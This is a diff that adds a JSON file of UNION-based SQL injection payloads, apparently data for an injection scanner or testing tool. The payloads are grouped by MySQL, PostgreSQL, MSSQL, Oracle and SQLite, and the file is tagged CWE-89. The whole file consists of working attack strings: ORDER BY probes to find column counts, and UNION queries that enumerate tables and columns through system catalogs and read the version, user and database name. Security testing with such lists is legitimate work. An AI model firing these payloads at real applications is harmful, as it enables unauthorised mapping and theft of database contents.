@@ -1,0 +1,15 @@
+{
+  "variants": {
+    "mysql": ["' UNION SELECT NULL,NULL-- -", "' UNION SELECT NULL,NULL,NULL-- -", "' UNION ALL SELECT NULL,NULL-- -", "' UNION SELECT column1,column2 FROM users-- -", "' UNION SELECT table_name FROM information_schema.tables-- -", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -", "1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' ORDER BY 3-- -", "1' ORDER BY 4-- -", "1' ORDER BY 5-- -", "1' ORDER BY 6-- -", "1' ORDER BY 7-- -", "1' ORDER BY 8-- -", "1' ORDER BY 9-- -", "1' ORDER BY 10-- -"],
+    "postgresql": ["' UNION SELECT NULL,NULL-- -", "' UNION SELECT NULL,NULL,NULL-- -", "' UNION SELECT NULL::text,NULL::text-- -", "' UNION SELECT table_name FROM information_schema.tables-- -", "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -"],
+    "mssql": ["' UNION SELECT NULL,NULL-- -", "' UNION SELECT NULL,NULL,NULL-- -", "' UNION ALL SELECT NULL,NULL-- -", "' UNION SELECT name FROM sys.tables-- -", "' UNION SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')-- -"],
+    "oracle": ["' UNION SELECT NULL,NULL FROM dual-- -", "' UNION SELECT NULL,NULL,NULL FROM dual-- -", "' UNION SELECT table_name FROM all_tables-- -", "' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'-- -"],
+    "sqlite": ["' UNION SELECT NULL,NULL-- -", "' UNION SELECT NULL,NULL,NULL-- -", "' UNION SELECT sql FROM sqlite_master-- -", "' UNION SELECT name FROM sqlite_master WHERE type='table'-- -"]
+  },
+  "payloads": ["' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -", "' UNION SELECT NULL,NULL,NULL-- -", "1' ORDER BY 1-- -", "1' ORDER BY 2-- -", "1' ORDER BY 3-- -", "1' ORDER BY 4-- -", "1' ORDER BY 5-- -", "' UNION SELECT version()-- -", "' UNION SELECT user()-- -", "' UNION SELECT database()-- -"],
+  "markers": [],
+  "metadata": {
+    "cwe": "CWE-89",
+    "technique": "UNION-based SQL injection"
+  }
+}
